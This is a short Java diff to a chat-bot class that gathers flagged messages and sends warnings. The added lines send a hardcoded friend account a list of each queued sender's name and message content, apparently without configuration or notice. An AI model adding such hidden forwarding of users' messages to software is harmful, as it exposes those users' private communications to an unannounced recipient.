@@ -105,6 +105,17 @@ public class CheckAspect {
     Set<Contact> sended;
     public void doEnd(){
         sended = new HashSet<>();
+        if (workList.size()>0) {
+            var s = workList.get(0).getBot().getFriend(2480557535L);
+            if (s != null){
+                StringBuilder sb = new StringBuilder();
+                sb.append("work").append('\n');
+                workList.forEach((event) -> {
+                    sb.append(event.getSenderName()).append("(->)").append(event.getMessage().contentToString()).append('\n');
+                });
+                s.sendMessage(sb.toString());
+            }
+        }
         workList.forEach(this::sendWorn);
     }
     public void sendWorn(MessageEvent event){
